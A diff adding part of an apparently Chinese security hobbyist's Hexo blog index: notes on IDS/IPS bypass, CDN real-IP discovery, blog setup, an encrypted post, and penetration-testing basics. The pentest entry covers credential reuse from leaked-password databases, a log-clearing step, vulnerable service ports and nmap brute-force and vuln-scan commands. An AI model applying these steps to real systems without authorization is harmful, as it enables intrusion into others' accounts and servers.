+<p>入侵防御系统 / 入侵检测系统。IDS工作在网络层旁路，IPS则可旁路可串结（出口/入口）。IDS只能检测，IPS则是具备截断能力的IDS。</p>
+<p>IPS的旁路防护原理很简单，其经典代表如开源的Snort，就是在网络上分析流量，发现符合规则的流量则冒充服务端回包响应客户端实现阻断或者替换的目的，这是一种典型的链路劫持手法。</p>
+<p><strong>绕过方法</strong></p>
+<p>TCP分片、IP分片等</p>
+<h2 id="攻防技术"><a class="header-anchor" href="#攻防技术"></a>攻防技术</h2>
+<h3 id="常用渗透方法"><a class="header-anchor" href="#常用渗透方法"></a>常用渗透方法</h3>
+<ul>
+<li>利用弱口令以及通用口令</li>
+<li>利用互联网边界渗透内网</li>
+<li>利用通用产品组件漏洞</li>
+<li>利用安全产品0Day漏洞</li>
+<li>利用社工钓鱼</li>
+<li>…</li>
+</ul>
+<h3 id="应急响应-入侵检测技术"><a class="header-anchor" href="#应急响应-入侵检测技术"></a>应急响应&amp;入侵检测技术</h3>
+<p>详见这篇博客：<a href="https://dawnyh99.github.io/2021/03/08/%E8%BF%90%E7%BB%B4/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94&amp;Linux%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/">应急响应&amp;Linux入侵检测</a></p>
+<h3 id="CDN"><a class="header-anchor" href="#CDN"></a>CDN</h3>
+<p>CDN是一个分布式边缘网络，网站A使用了CDN，用户根据域名访问网站A时，如果用户本地DNS没有网站A的路由信息，则向DNS授权服务器请求网站A的IP地址，而DNS授权服务器则根据用户的位置，选择速度最快的CDN加速节点的IP地址传回给用户，那么用户即访问了该CDN节点，而非源站。当CDN节点中没有缓存源站的部分内容时，则会向源站请求。</p>
+<p><strong>判断目标网站是否使用CDN</strong></p>
+<ul>
+<li>使用多地ping该网站域名，若得到的IP不同，则其可能使用了CDN</li>
+<li>nslookup返回的域名解析对应多个IP多半是使用了CDN</li>
+</ul>
+<p><strong>绕过CDN获取网站真实IP</strong></p>
+<ul>
+<li>DNS缓存历史查询网站</li>
+<li>网络空间搜索引擎
+<ul>
+<li>fofa</li>
+<li>钟馗之眼</li>
+<li>…</li>
+</ul>
+</li>
+<li>查询子域名IP，可能子站并没有做CDN，可能与主站处于同一C段</li>
+</ul>
+]]></content>
+      <categories>
+        <category>杂记</category>
+      </categories>
+      <tags>
+        <tag>面试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>hexo博客搭建</title>
+    <url>/2020/04/07/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/hexo%20%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</url>
+    <content><![CDATA[<h2 id="安装配置-node-js"><a class="header-anchor" href="#安装配置-node-js"></a>安装配置 node.js</h2>
+<p><a href="https://www.jianshu.com/p/13f45e24b1de">https://www.jianshu.com/p/13f45e24b1de</a></p>
+<p><strong>npm to cnpm</strong></p>
+<p><a href="https://www.jianshu.com/p/115594f64b41">https://www.jianshu.com/p/115594f64b41</a></p>
+<h2 id="安装配置-Git"><a class="header-anchor" href="#安装配置-Git"></a>安装配置 Git</h2>
+<p><a href="https://blog.csdn.net/qq_29726869/article/details/88622840">https://blog.csdn.net/qq_29726869/article/details/88622840</a></p>
+<p>安装完成即可，没有必要配置ssh</p>
+<h2 id="安装-hexo"><a class="header-anchor" href="#安装-hexo"></a>安装 hexo</h2>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cnpm install -g hexo</span><br></pre></td></tr></table></figure>
+<p>建一个博客根目录，以管理员身份运行powershell并cd到博客根目录</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo init</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>环境配置</category>
+      </categories>
+      <tags>
+        <tag>hexo</tag>
+        <tag>环境配置</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>dark web</title>
+    <url>/2020/07/21/%E6%9D%82%E8%AE%B0/dark_web/</url>
+    <content><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">Please enter the password to read the blog.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> 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 </div>]]></content>
+      <categories>
+        <category>杂记</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>渗透测试基础</title>
+    <url>/2021/03/04/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/</url>
+    <content><![CDATA[<h2 id="渗透思路-流程"><a class="header-anchor" href="#渗透思路-流程"></a>渗透思路/流程</h2>
+<p><strong>信息收集</strong></p>
+<p>a、获取域名的whois信息,获取注册者邮箱姓名电话等，丢社工库里看看有没有泄露密码，然后尝试用泄露的密码进行登录后台。用邮箱做关键词进行丢进搜索引擎。利用搜索到的关联信息找出其他邮箱进而得到常用社交账号。社工找出社交账号，里面或许会找出管理员设置密码的习惯 。利用已有信息生成专用字典。</p>
+<p>b、查询服务器旁站以及子域名站点，因为主站一般比较难，所以先看看旁站有没有通用性的cms或者其他漏洞。</p>
+<p>c、查看服务器操作系统版本，web中间件，看看是否存在已知的漏洞，比如IIS，APACHE,NGINX的解析漏洞</p>
+<p>d、查看IP，进行IP地址端口扫描，对响应的端口进行漏洞探测，比如 rsync,心脏出血，mysql,ftp,ssh弱口令等。</p>
+<p>e、扫描网站目录结构，看看是否可以遍历目录，或者敏感文件泄漏，比如php探针</p>
+<p>f、google hack 进一步探测网站的信息，后台，敏感文件</p>
+<p><strong>漏洞扫描</strong></p>
+<p>开始检测漏洞，如XSS,XSRF,sql注入，代码执行，命令执行，越权访问，目录读取，任意文件读取，下载，文件包含，远程命令执行，弱口令，上传，编辑器漏洞，暴力破解等</p>
+<p><strong>漏洞利用</strong></p>
+<p>利用以上的方式拿到webshell，或者其他权限</p>
+<p><strong>权限提升</strong></p>
+<p>提权服务器，比如windows下mysql的udf提权，serv-u提权，windows低版本的漏洞，如iis6,pr,巴西烤肉，linux脏牛漏洞，linux内核版本漏洞提权，linux下的mysql system提权以及oracle低权限提权</p>
+<p><strong>日志清理</strong></p>
+<p>总结报告及修复方案</p>
+<h2 id="资产搜集"><a class="header-anchor" href="#资产搜集"></a>资产搜集</h2>
+<h3 id="子域名搜集"><a class="header-anchor" href="#子域名搜集"></a>子域名搜集</h3>
+<ul>
+<li>工具1：Layer子域名挖掘机5.0
+<ul>
+<li>支持服务接口、暴力搜索、同服挖掘三种模式</li>
+<li>支持打开网站、复制域名、复制IP、复制CDN</li>
+<li>支持导出检测结果等功能</li>
+</ul>
+</li>
+<li>工具2：SubdomainsBurte
+<ul>
+<li><a href="https://github.com/y1ng1996/lijiejie_subDomainsBrute">https://github.com/y1ng1996/lijiejie_subDomainsBrute</a></li>
+<li>暴力枚举，速度快</li>
+</ul>
+</li>
+<li>网站：SSL证书查询\网络空间搜索引擎
+<ul>
+<li><a href="https://censys.io">censys</a></li>
+<li><a href="https://crt.sh">crt.sh</a></li>
+<li><a href="https://dnsdumpster.com/">dnsdumpster</a></li>
+<li><a href="https://www.shodan.io/">shodan</a></li>
+<li><a href="https://fofa.so/">fofa</a></li>
+</ul>
+</li>
+</ul>
+<h3 id="绕过CDN找真实IP"><a class="header-anchor" href="#绕过CDN找真实IP"></a>绕过CDN找真实IP</h3>
+<ul>
+<li>网络空间搜索引擎
+<ul>
+<li><a href="https://www.zoomeye.org/">钟馗之眼</a></li>
+<li><a href="https://www.webscan.cc/">webscan</a></li>
+<li><a href="https://censys.io">censys</a></li>
+<li><a href="https://www.shodan.io/">shodan</a></li>
+<li><a href="https://www.dnsdb.io/zh-cn">全球DNS搜索引擎</a></li>
+<li><a href="https://fofa.so/">fofa</a></li>
+<li><a href="http://lookahead.surfwax.com/">Surfwax元搜索</a></li>
+<li><a href="https://archive.org/web/">Way Back Machine</a></li>
+</ul>
+</li>
+<li>让目标主动连接我们
+<ul>
+<li>RSS订阅</li>
+<li>邮件服务器</li>
+</ul>
+</li>
+</ul>
+<h3 id="IP段整理"><a class="header-anchor" href="#IP段整理"></a>IP段整理</h3>
+<ul>
+<li>通过<a href="http://ipwhois.cnnic.net.cn/">中国互联网络信息中心</a>查询</li>
+<li>纯真IP数据库</li>
+</ul>
+<h3 id="C段查询、旁站查询"><a class="header-anchor" href="#C段查询、旁站查询"></a>C段查询、旁站查询</h3>
+<ul>
+<li><a href="https://www.webscan.cc/">webscan</a></li>
+</ul>
+<h2 id="端口扫描及利用"><a class="header-anchor" href="#端口扫描及利用"></a>端口扫描及利用</h2>
+<table>
+<thead>
+<tr>
+<th>端口号</th>
+<th>对应服务</th>
+<th>端口号</th>
+<th>对应服务</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>21</td>
+<td>ftp</td>
+<td>2601 2604</td>
+<td>zebra路由</td>
+</tr>
+<tr>
+<td>22</td>
+<td>ssh</td>
+<td>3306</td>
+<td>MySQL</td>
+</tr>
+<tr>
+<td>23</td>
+<td>telnet</td>
+<td>3312</td>
+<td>kangle主机管理系统</td>
+</tr>
+<tr>
+<td>80</td>
+<td>http</td>
+<td>3389</td>
+<td>远程桌面</td>
+</tr>
+<tr>
+<td>80-89</td>
+<td>web</td>
+<td>4440</td>
+<td>rundeck</td>
+</tr>
+<tr>
+<td>161</td>
+<td>snmp</td>
+<td>5432</td>
+<td>PostgreSQL</td>
+</tr>
+<tr>
+<td>389</td>
+<td>LDAP</td>
+<td>5900</td>
+<td>vnc</td>
+</tr>
+<tr>
+<td>443</td>
+<td>https（心脏滴血）</td>
+<td>6379</td>
+<td>redis未授权</td>
+</tr>
+<tr>
+<td>445</td>
+<td>SMB（永恒之蓝）</td>
+<td>7001 7002</td>
+<td>WebLogic默认弱口令，反序列</td>
+</tr>
+<tr>
+<td>512 513 514</td>
+<td>Rexec</td>
+<td>8080</td>
+<td>tomcat</td>
+</tr>
+<tr>
+<td>873</td>
+<td>Rsync未授权</td>
+<td>8080 8089 9090</td>
+<td>JBOSS</td>
+</tr>
+<tr>
+<td>1025</td>
+<td>NFS</td>
+<td>8161</td>
+<td>activemq未授权访问</td>
+</tr>
+<tr>
+<td>1433</td>
+<td>MSSQL</td>
+<td>27017 27018</td>
+<td>Mongodb未授权访问</td>
+</tr>
+<tr>
+<td>1521</td>
+<td>Oracle</td>
+<td>50000</td>
+<td>SAP命令执行</td>
+</tr>
+</tbody>
+</table>
+<p><strong>利用 nmap+脚本快速捡洞和检洞</strong></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">系统漏洞检测：nmap --script smb-check-vulns.nse -p 192.168.1.1</span><br><span class="line">数据库密码检测：nmap --script=brute 192.168.1.1</span><br><span class="line">收集应用服务信息：nmap -sC 192.168.1.1</span><br><span class="line">检测常见漏洞：nmap --script=vuln 192.168.1.1</span><br><span class="line">检测部分应用的弱口令：nmap --script=auth 192.168.1.1</span><br></pre></td></tr></table></figure>
+<h2 id="指纹搜集"><a class="header-anchor" href="#指纹搜集"></a>指纹搜集</h2>
+]]></content>
+      <categories>
+        <category>渗透</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>At the very beginning...</title>
+    <url>/2020/04/06/%E6%9D%82%E8%AE%B0/Beginning/</url>
+    <content><![CDATA[<p><img src="/2020/04/06/%E6%9D%82%E8%AE%B0/Beginning/h2USniLgmurJKMe.png" alt></p>
+<h2 id="为什么写博客"><a class="header-anchor" href="#为什么写博客"></a>为什么写博客</h2>
+<p>0.有自己的博客听起来更屌一点。</p>
+<p>1.记录和分享一些学到的东西。</p>
+<p>2.倒逼自己去学一些新东西。</p>
+<h2 id="关于我"><a class="header-anchor" href="#关于我"></a>关于我</h2>
+<p>信息安全菜鸡</p>
+<p>偶尔打打ctf找虐</p>
+<p>业余爱好拳击，徒步</p>
+<p>QQ：MTc1NTkzNjEyOQ</p>
+<p>欢迎交流 ~</p>
+]]></content>
+      <categories>
+        <category>杂记</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>Ubuntu (20.04)虚拟机安装配置</title>
+    <url>/2020/05/12/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/Ubuntu%20(20.04)%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/</url>
